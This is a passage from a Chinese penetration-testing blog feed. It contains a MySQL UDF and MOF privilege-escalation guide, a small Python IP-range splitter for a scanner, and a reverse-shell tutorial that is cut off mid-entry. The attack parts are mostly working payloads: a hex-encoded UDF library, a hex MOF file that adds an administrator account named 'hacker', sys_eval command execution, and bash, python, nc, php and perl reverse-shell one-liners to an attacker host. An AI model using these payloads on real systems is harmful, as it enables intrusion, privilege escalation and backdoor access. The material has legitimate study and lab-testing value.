class="hljs-number">0000000058840000010000001200000012000000</span>a<span class="hljs-number">4830000</span>ec<span class="hljs-number">8300003484000021100000</span>a<span class="hljs-number">312000000100000</span>a<span class="hljs-number">4120000</span>a<span class="hljs-number">3120000</span>a<span class="hljs-number">0120000</span>cc<span class="hljs-number">110000</span>a<span class="hljs-number">31200009811000086110000</span>a<span class="hljs-number">31200009811000076100000</span>a<span class="hljs-number">3120000431000002</span>e<span class="hljs-number">1100001</span>a<span class="hljs-number">110000</span>a<span class="hljs-number">91000006</span>d<span class="hljs-number">84000083840000</span>a<span class="hljs-number">0840000</span>bb<span class="hljs-number">840000</span>c<span class="hljs-number">7840000</span>da<span class="hljs-number">840000</span>eb<span class="hljs-number">840000</span>f<span class="hljs-number">484000004850000128500001</span>b<span class="hljs-number">8500002</span>b<span class="hljs-number">8500003985000041850000508500005</span>d<span class="hljs-number">850000658500007485000000000100020003000400050006000700080009000</span>a<span class="hljs-number">000</span>b<span class="hljs-number">000</span>c<span class="hljs-number">000</span>d<span class="hljs-number">000</span>e<span class="hljs-number">000</span>f<span class="hljs-number">00100011006</span>c<span class="hljs-number">69625</span>f<span class="hljs-number">6</span>d<span class="hljs-number">7973716</span>c<span class="hljs-number">7564665</span>f<span class="hljs-number">7379732</span>e<span class="hljs-number">646</span>c<span class="hljs-number">6</span>c<span class="hljs-number">006</span>c<span class="hljs-number">69625</span>f<span class="hljs-number">6</span>d<span class="hljs-number">7973716</span>c<span class="hljs-number">7564665</span>f<span class="hljs-number">7379735</span>f<span class="hljs-number">696</span>e<span class="hljs-number">666</span>f<span class="hljs-number">006</span>c<span class="hljs-number">69625</span>f<span class="hljs-number">6</span>d<span class="hljs-number">7973716</span>c<span class="hljs-number">7564665</span>f<span class="hljs-number">7379735</span>f<span class="hljs-number">696</span>e<span class="hljs-number">666</span>f<span class="hljs-number">5</span>f<span class="hljs-number">6465696</span>e<span class="hljs-number">6974006</span>c<span class="hljs-number">69625</span>f<span class="hljs-number">6</span>d<span class="hljs-number">7973716</span>c<span class="hljs-number">7564665</span>f<span class="hljs-number">7379735</span>f<span class="hljs-number">696</span>e<span class="hljs-number">666</span>f<span class="hljs-number">5</span>f<span class="hljs-number">696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">62696</span>e<span class="hljs-number">6576616</span>c<span class="hljs-number">007379735</span>f<span class="hljs-number">62696</span>e<span class="hljs-number">6576616</span>c<span class="hljs-number">5</span>f<span class="hljs-number">6465696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">62696</span>e<span class="hljs-number">6576616</span>c<span class="hljs-number">5</span>f<span class="hljs-number">696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">6576616</span>c<span class="hljs-number">007379735</span>f<span class="hljs-number">6576616</span>c<span class="hljs-number">5</span>f<span class="hljs-number">6465696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">6576616</span>c<span class="hljs-number">5</span>f<span class="hljs-number">696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">65786563007379735</span>f<span class="hljs-number">657865635</span>f<span class="hljs-number">6465696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">657865635</span>f<span class="hljs-number">696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">676574007379735</span>f<span class="hljs-number">6765745</span>f<span class="hljs-number">6465696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">6765745</span>f<span class="hljs-number">696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">736574007379735</span>f<span class="hljs-number">7365745</span>f<span class="hljs-number">6465696</span>e<span class="hljs-number">6974007379735</span>f<span class="hljs-number">7365745</span>f<span class="hljs-number">696</span>e<span class="hljs-number">69740000000000700000100000006</span>d<span class="hljs-number">3</span>c<span class="hljs-number">683</span>e<span class="hljs-number">6</span>c<span class="hljs-number">3</span>e<span class="hljs-number">0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</span> INTO DUMPFILE &#x27;C:\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;;<br></code></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">C</span>:<span class="hljs-string">\\phpStudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> hex(load_file(<span class="hljs-string">&#x27;C:\lib_mysqludf_sys.dll&#x27;</span>)) <span class="hljs-keyword">into</span> outfile &quot;C:\udf32.hex&quot;;<span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;lib_mysqludf_sys_64.dll&#x27;</span>;<span class="hljs-keyword">select</span> sys_eval(&quot;whoami&quot;);<br></code></pre></td></tr></table></figure><h2 id="linux-mysql-udf提权"><a class="markdownIt-Anchor" href="#linux-mysql-udf提权"></a> Linux mysql udf提权</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span>、linux中mysql默认是以mysql用户运行，相对比较安全（为了完成实验，将mysql用户修改为root用户）/etc/mysql/my.cnf,修改第四行的<span class="hljs-keyword">user</span>=root,bind-address=<span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.02</span>、<span class="hljs-number">2.</span>ssh远程连接Centos，安装服务：yum -y install httpd php mysql-<span class="hljs-keyword">server</span> php-mysql3、关闭防火墙service iptaables stop，关闭selinux：setenforce <span class="hljs-number">04</span>、开启服务:service httpd <span class="hljs-keyword">start</span>与  service mysqld start5、查看数据库版本：<span class="hljs-keyword">select</span> version();  为<span class="hljs-number">5.1</span><span class="hljs-number">.736</span>、获取路径：<span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%plugin%&#x27;</span>  为 /usr/lib64/mysql/plugin/usr/lib/mysql/plugin/<span class="hljs-number">7</span>、检查有无上传文件权限：<span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<span class="hljs-number">8</span>、上传UDF：<span class="hljs-keyword">select</span> unhex(<span class="hljs-string">&#x27;十六进制&#x27;</span>)<span class="hljs-keyword">into</span> dumpfile &quot;/usr/lib64/mysql/plugin/udf.so&quot;;<span class="hljs-number">9</span>、创造函数：<span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.so&#x27;</span><span class="hljs-number">10</span>、执行系统命令：<span class="hljs-keyword">SELECT</span> sys_eval(&quot;id&quot;)<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> sys_eval <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func <span class="hljs-keyword">where</span> <span class="hljs-type">name</span> = <span class="hljs-string">&#x27;sys_eval&#x27;</span>;<span class="hljs-keyword">select</span> sys_eval(<span class="hljs-string">&#x27;ping www.baidu.com&#x27;</span>);<span class="hljs-keyword">drop</span> <span class="hljs-keyword">function</span> cmdshell;// 将函数删除<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> mysql.func; //查询当前函数<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">select</span> <span class="hljs-number">0</span>x<span class="hljs-number">23707261676</span>D<span class="hljs-number">61206</span>E<span class="hljs-number">616</span>D<span class="hljs-number">65737061636528225</span>C<span class="hljs-number">5</span>C<span class="hljs-number">5</span>C<span class="hljs-number">5</span>C<span class="hljs-number">2</span>E<span class="hljs-number">5</span>C<span class="hljs-number">5</span>C<span class="hljs-number">726</span>F<span class="hljs-number">6</span>F<span class="hljs-number">745</span>C<span class="hljs-number">5</span>C<span class="hljs-number">737562736372697074696</span>F<span class="hljs-number">6</span>E<span class="hljs-number">2229200</span>A<span class="hljs-number">0</span>A<span class="hljs-number">696</span>E<span class="hljs-number">7374616</span>E<span class="hljs-number">6365206</span>F<span class="hljs-number">66205</span>F<span class="hljs-number">5</span>F<span class="hljs-number">4576656</span>E<span class="hljs-number">7446696</span>C<span class="hljs-number">74657220617320244576656</span>E<span class="hljs-number">7446696</span>C<span class="hljs-number">746572200</span>A<span class="hljs-number">7</span>B<span class="hljs-number">200</span>A<span class="hljs-number">202020204576656</span>E<span class="hljs-number">744</span>E<span class="hljs-number">616</span>D<span class="hljs-number">657370616365203</span>D<span class="hljs-number">2022526</span>F<span class="hljs-number">6</span>F<span class="hljs-number">745</span>C<span class="hljs-number">5</span>C<span class="hljs-number">43696</span>D<span class="hljs-number">7632223</span>B<span class="hljs-number">200</span>A<span class="hljs-number">202020204</span>E<span class="hljs-number">616</span>D<span class="hljs-number">6520203</span>D<span class="hljs-number">202266696</span>C<span class="hljs-number">745032223</span>B<span class="hljs-number">200</span>A<span class="hljs-number">202020205175657279203</span>D<span class="hljs-number">202253656</span>C<span class="hljs-number">656374202</span>A<span class="hljs-number">2046726</span>F<span class="hljs-number">6</span>D<span class="hljs-number">205</span>F<span class="hljs-number">5</span>F<span class="hljs-number">496</span>E<span class="hljs-number">7374616</span>E<span class="hljs-number">63654</span>D<span class="hljs-number">6</span>F<span class="hljs-number">64696669636174696</span>F<span class="hljs-number">6</span>E<span class="hljs-number">4576656</span>E<span class="hljs-number">742022200</span>A<span class="hljs-number">20202020202020202020202022576865726520546172676574496</span>E<span class="hljs-number">7374616</span>E<span class="hljs-number">636520497361205</span>C<span class="hljs-number">2257696</span>E<span class="hljs-number">33325</span>F<span class="hljs-number">4</span>C<span class="hljs-number">6</span>F<span class="hljs-number">63616</span>C<span class="hljs-number">54696</span>D<span class="hljs-number">655</span>C<span class="hljs-number">222022200</span>A<span class="hljs-number">20202020202020202020202022416</span>E<span class="hljs-number">6420546172676574496</span>E<span class="hljs-number">7374616</span>E<span class="hljs-number">63652</span>E<span class="hljs-number">5365636</span>F<span class="hljs-number">6</span>E<span class="hljs-number">64203</span>D<span class="hljs-number">2035223</span>B<span class="hljs-number">200</span>A<span class="hljs-number">2020202051756572794</span>C<span class="hljs-number">616</span>E<span class="hljs-number">6775616765203</span>D<span class="hljs-number">202257514</span>C<span class="hljs-number">223</span>B<span class="hljs-number">200</span>A<span class="hljs-number">7</span>D<span class="hljs-number">3</span>B<span class="hljs-number">200</span>A<span class="hljs-number">0</span>A<span class="hljs-number">696</span>E<span class="hljs-number">7374616</span>E<span class="hljs-number">6365206</span>F<span class="hljs-number">66204163746976655363726970744576656</span>E<span class="hljs-number">74436</span>F<span class="hljs-number">6</span>E<span class="hljs-number">73756</span>D<span class="hljs-number">65722061732024436</span>F<span class="hljs-number">6</span>E<span class="hljs-number">73756</span>D<span class="hljs-number">6572200</span>A<span class="hljs-number">7</span>B<span class="hljs-number">200</span>A<span class="hljs-number">202020204</span>E<span class="hljs-number">616</span>D<span class="hljs-number">65203</span>D<span class="hljs-number">2022636</span>F<span class="hljs-number">6</span>E<span class="hljs-number">735043535632223</span>B<span class="hljs-number">200</span>A<span class="hljs-number">20202020536372697074696</span>E<span class="hljs-number">67456</span>E<span class="hljs-number">67696</span>E<span class="hljs-number">65203</span>D<span class="hljs-number">20224</span>A<span class="hljs-number">536372697074223</span>B<span class="hljs-number">200</span>A<span class="hljs-number">2020202053637269707454657874203</span>D<span class="hljs-number">200</span>A<span class="hljs-number">2276617220575348203</span>D<span class="hljs-number">206</span>E<span class="hljs-number">657720416374697665584</span>F<span class="hljs-number">626</span>A<span class="hljs-number">656374285</span>C<span class="hljs-number">22575363726970742</span>E<span class="hljs-number">5368656</span>C<span class="hljs-number">6</span>C<span class="hljs-number">5</span>C<span class="hljs-number">22295</span>C<span class="hljs-number">6</span>E<span class="hljs-number">5753482</span>E<span class="hljs-number">72756</span>E<span class="hljs-number">285</span>C<span class="hljs-number">226</span>E<span class="hljs-number">65742</span>E<span class="hljs-number">6578652075736572206861636</span>B<span class="hljs-number">6572205040737377307264202</span>F<span class="hljs-number">6164645</span>C<span class="hljs-number">22295</span>C<span class="hljs-number">6</span>E<span class="hljs-number">5753482</span>E<span class="hljs-number">72756</span>E<span class="hljs-number">285</span>C<span class="hljs-number">226</span>E<span class="hljs-number">65742</span>E<span class="hljs-number">657865206</span>C<span class="hljs-number">6</span>F<span class="hljs-number">63616</span>C<span class="hljs-number">67726</span>F<span class="hljs-number">75702061646</span>D<span class="hljs-number">696</span>E<span class="hljs-number">6973747261746</span>F<span class="hljs-number">7273206861636</span>B<span class="hljs-number">6572202</span>F<span class="hljs-number">6164645</span>C<span class="hljs-number">2229223</span>B<span class="hljs-number">200</span>A<span class="hljs-number">7</span>D<span class="hljs-number">3</span>B<span class="hljs-number">200</span>A<span class="hljs-number">0</span>A<span class="hljs-number">696</span>E<span class="hljs-number">7374616</span>E<span class="hljs-number">6365206</span>F<span class="hljs-number">66205</span>F<span class="hljs-number">5</span>F<span class="hljs-number">46696</span>C<span class="hljs-number">746572546</span>F<span class="hljs-number">436</span>F<span class="hljs-number">6</span>E<span class="hljs-number">73756</span>D<span class="hljs-number">657242696</span>E<span class="hljs-number">64696</span>E<span class="hljs-number">67200</span>A<span class="hljs-number">7</span>B<span class="hljs-number">200</span>A<span class="hljs-number">20202020436</span>F<span class="hljs-number">6</span>E<span class="hljs-number">73756</span>D<span class="hljs-number">65722020203</span>D<span class="hljs-number">2024436</span>F<span class="hljs-number">6</span>E<span class="hljs-number">73756</span>D<span class="hljs-number">65723</span>B<span class="hljs-number">200</span>A<span class="hljs-number">2020202046696</span>C<span class="hljs-number">746572203</span>D<span class="hljs-number">20244576656</span>E<span class="hljs-number">7446696</span>C<span class="hljs-number">7465723</span>B<span class="hljs-number">200</span>A<span class="hljs-number">7</span>D<span class="hljs-number">3</span>B<span class="hljs-number">0</span>A into dumpfile <span class="hljs-string">&quot;C:/windows/system32/wbem/mof/test.mof&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">192.168.241.141</span>/<span class="hljs-number">7896</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python分割补全ip小脚本(用于goby)</title>
    <link href="/2021/09/25/python%E5%88%86%E5%89%B2%E8%A1%A5%E5%85%A8ip%E5%B0%8F%E8%84%9A%E6%9C%AC-%E7%94%A8%E4%BA%8Egoby/"/>
    <url>/2021/09/25/python%E5%88%86%E5%89%B2%E8%A1%A5%E5%85%A8ip%E5%B0%8F%E8%84%9A%E6%9C%AC-%E7%94%A8%E4%BA%8Egoby/</url>
    
    <content type="html"><![CDATA[<h1 id="python分割补全ip小脚本用于goby"><a class="markdownIt-Anchor" href="#python分割补全ip小脚本用于goby"></a> python分割补全ip小脚本(用于goby)</h1><h2 id="0x00-前言"><a class="markdownIt-Anchor" href="#0x00-前言"></a> 0x00 前言</h2><p>​在渗透测试中，时常遇到给的资产像123.123.123.12-46,123.211.111.2,123.123.111.4-7,111.111.111.111，诸如此类用逗号分开，然后ip范围是在后面像12-46这样指定的资产，goby不能识别这样的ip，只认123.123.123.12-123.123.123.46，这样的，每次都得整理ip然后放进去扫描，整得烦了于是手写了这个小工具代码。</p><h2 id="0x01-代码"><a class="markdownIt-Anchor" href="#0x01-代码"></a> 0x01 代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">chai</span>(<span class="hljs-params">sip</span>):</span><br>    lensip = <span class="hljs-built_in">len</span>(sip)<br>    qian = <span class="hljs-string">&quot;&quot;</span><br>    daigang = <span class="hljs-string">&quot;&quot;</span><br>    hou = <span class="hljs-string">&quot;&quot;</span><br>    flag2 =<span class="hljs-number">0</span><br>    <span class="hljs-comment">#print sip</span><br>    flag=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,lensip):<br><br>        <span class="hljs-keyword">if</span>  flag !=<span class="hljs-number">3</span> :<br>            qian += sip[i]<br>        <span class="hljs-keyword">if</span> sip[i] == <span class="hljs-string">&#x27;.&#x27;</span>:<br>            flag+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> flag2 ==<span class="hljs-number">1</span>:<br>            hou += sip[i] <br>        <span class="hljs-keyword">if</span> sip[i] == <span class="hljs-string">&#x27;-&#x27;</span>:<br>            flag2 = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> sip[i] !=<span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">and</span> flag2 !=<span class="hljs-number">1</span>:<br>            <span class="hljs-comment">#print flag2</span><br>            daigang += sip[i]<br><br>    daigang += <span class="hljs-string">&#x27;-&#x27;</span><br>    <span class="hljs-comment">#print daigang</span><br>    <span class="hljs-comment">#print qian</span><br>    <span class="hljs-comment">#print hou</span><br>    <span class="hljs-built_in">print</span> (daigang+qian+hou)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    strip = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;输入ip：&#x27;</span>)<br>    lenip = <span class="hljs-built_in">len</span>(strip)<br>    <span class="hljs-comment">#print lenip</span><br>    listip = []<br>    temp1 = <span class="hljs-string">&quot;&quot;</span><br>    flaggang=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,lenip):<br>        <span class="hljs-comment">#print i</span><br>        <span class="hljs-keyword">if</span> strip[i]!=<span class="hljs-string">&#x27;,&#x27;</span>:<br>            <br>            temp1 += strip[i]<br>        <span class="hljs-keyword">if</span> strip[i] == <span class="hljs-string">&#x27;-&#x27;</span>:<br>            flaggang = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> strip[i] == <span class="hljs-string">&#x27;,&#x27;</span>:<br>            <span class="hljs-keyword">if</span> flaggang != <span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">print</span> (temp1)<br>            <span class="hljs-keyword">if</span> flaggang == <span class="hljs-number">1</span>:<br>                chai(temp1)<br>            temp1 = <span class="hljs-string">&quot;&quot;</span><br>            flaggang = <span class="hljs-number">0</span> <br>        <span class="hljs-comment">#print temp1</span><br>        <span class="hljs-keyword">if</span> i == lenip-<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">if</span> flaggang != <span class="hljs-number">1</span>:<br>                <span class="hljs-built_in">print</span> (temp1)<br>            <span class="hljs-keyword">if</span> flaggang == <span class="hljs-number">1</span>:<br>                chai(temp1)<br>            temp1 = <span class="hljs-string">&quot;&quot;</span> <br>            flaggang = <span class="hljs-number">0</span> <br></code></pre></td></tr></table></figure><p>​主要实现ip分割，然后换行输出（虽然goby能识别&quot;,&quot;号）把123.123.123.12-46这样的ip取出来，输出为123.123.123.12-123.123.123.46这样的形式，写的拉个人使用罢了，效果如下：</p><img src="/2021/09/25/python%E5%88%86%E5%89%B2%E8%A1%A5%E5%85%A8ip%E5%B0%8F%E8%84%9A%E6%9C%AC-%E7%94%A8%E4%BA%8Egoby/image-20210925223024444.png" alt="image-20210925223024444" style="zoom:80%;">]]></content>
    
    
    <categories>
      
      <category>小工具</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux/windows反弹shell的利用方式和复现</title>
    <link href="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="linuxwindows反弹shell的利用方式和复现"><a class="markdownIt-Anchor" href="#linuxwindows反弹shell的利用方式和复现"></a> linux/windows反弹shell的利用方式和复现</h1><h2 id="1linux反弹"><a class="markdownIt-Anchor" href="#1linux反弹"></a> 1.linux反弹</h2><h3 id="11bash反弹"><a class="markdownIt-Anchor" href="#11bash反弹"></a> 1.1.Bash反弹</h3><p>攻击机器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机端口 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>效果</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923170215201.png" alt="image-20210923170215201" style="zoom:80%;"><h3 id="12python反弹"><a class="markdownIt-Anchor" href="#12python反弹"></a> 1.2.python反弹</h3><p>攻击机器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;攻击机ip&#x27;,攻击机端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></code></pre></td></tr></table></figure><p>效果</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923171211993.png" alt="image-20210923171211993" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923171229676.png" alt="image-20210923171229676" style="zoom:80%;"><h3 id="13nc反弹"><a class="markdownIt-Anchor" href="#13nc反弹"></a> 1.3.nc反弹</h3><p><strong>需要靶机安装NC，且nc需要有-e参数（全功能版本）</strong>，自带版本可能不行需要上传或者安装带-e参数版本</p><p>攻击机器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 攻击机ip 攻击机端口<br></code></pre></td></tr></table></figure><p>效果</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923172753686.png" alt="image-20210923172753686" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923172814218.png" alt="image-20210923172814218" style="zoom:80%;"><h3 id="14php反弹"><a class="markdownIt-Anchor" href="#14php反弹"></a> 1.4.php反弹</h3><p>攻击机器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机端口);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span> <br></code></pre></td></tr></table></figure><p>效果</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923213837682.png" alt="image-20210923213837682" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923213815351.png" alt="image-20210923213815351" style="zoom:80%;"><h3 id="15perl反弹shell"><a class="markdownIt-Anchor" href="#15perl反弹shell"></a> <strong>1.5.perl反弹shell</strong></h3><p>攻击机器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;攻击机ip&quot;;$p=攻击机端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p>效果</p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924100730572.png" alt="image-20210924100730572" style="zoom:80%;"><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924100705938.png" alt="image-20210924100705938" style="zoom:80%;"><h3 id="16awk反弹shell"><a class="markdownIt-Anchor" href="#16awk反弹shell"></a> 1.6.awk反弹shell</h3><p>攻击机器命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure><p>靶机命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span 